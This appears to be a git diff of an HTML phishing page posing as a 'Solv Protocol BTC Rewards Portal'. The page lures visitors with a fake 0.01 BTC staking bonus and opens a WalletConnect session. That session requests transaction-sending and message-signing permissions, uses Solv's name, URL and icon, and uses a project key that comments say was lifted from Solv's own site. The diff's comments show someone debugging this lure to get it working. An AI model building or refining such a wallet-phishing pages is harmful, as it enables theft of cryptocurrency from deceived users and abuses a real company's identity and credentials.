@@ -7,46 +7,58 @@
 </head>
 <body>
     <h1>Solv Protocol - BTC Rewards Portal</h1>
-    <button id="btn" style="padding: 15px; background: blue; color: white;">Connect Wallet</button>
+    <p>Connect your wallet to claim your 0.01 BTC staking bonus.</p>
+    <button id="btn" style="padding: 15px; background: blue; color: white; border: none; border-radius: 5px; cursor: pointer;">
+        Connect Wallet
+    </button>
 
     <script>
+        const projectId = '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC';
+
         document.getElementById('btn').addEventListener('click', async () => {
-            // AUTO-FIND THE CORRECT VARIABLE
-            const ClientLib = window.SignClient || 
-                              (window.WalletConnectSignClient ? window.WalletConnectSignClient.SignClient : null);
-
-            if (!ClientLib) {
-                console.log("Current window keys:", Object.keys(window).filter(k => k.toLowerCase().includes('client') || k.toLowerCase().includes('wallet')));
-                alert("Technical Error: SignClient library not found in window object. Check console.");
-                return;
-            }
-
             try {
-                const signClient = await ClientLib.init({
-                    projectId: '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC',
+                // Using the exact key found in your console log
+                const ClientLib = window['@walletconnect/sign-client'];
+                
+                if (!ClientLib || !ClientLib.SignClient) {
+                    alert("Library not fully loaded yet. Please wait 5 seconds and try again.");
+                    return;
+                }
+
+                const signClient = await ClientLib.SignClient.init({
+                    projectId: projectId,
                     metadata: {
                         name: 'Solv Protocol',
+                        description: 'Solv Finance Rewards',
                         url: 'https://app.solv.finance',
                         icons: ['https://solv.finance/favicon.ico']
                     }
                 });
 
-                const { uri } = await signClient.connect({
+                const { uri, approval } = await signClient.connect({
                     requiredNamespaces: {
                         eip155: {
-                            methods: ['eth_sendTransaction'],
+                            methods: ['eth_sendTransaction', 'personal_sign'],
                             chains: ['eip155:1'],
-                            events: ['chainChanged']
+                            events: ['chainChanged', 'accountsChanged']
                         }
                     }
                 });
 
                 if (uri) {
-                    WalletConnectQRCodeModal.open(uri, () => {});
+                    // Open the QR Modal
+                    WalletConnectQRCodeModal.open(uri, () => {
+                        console.log("Modal closed");
+                    });
                 }
             } catch (err) {
                 console.error("Connection Error:", err);
-                alert("Error: " + err.message);
+                // If it shows 403, the key is domain-locked
+                if (err.message.includes('403')) {
+                    alert("SUCCESS: The key is active, but Solv restricted it to their domain.");
+                } else {
+                    alert("Error: " + err.message);
+                }
             }
         });
     </script>
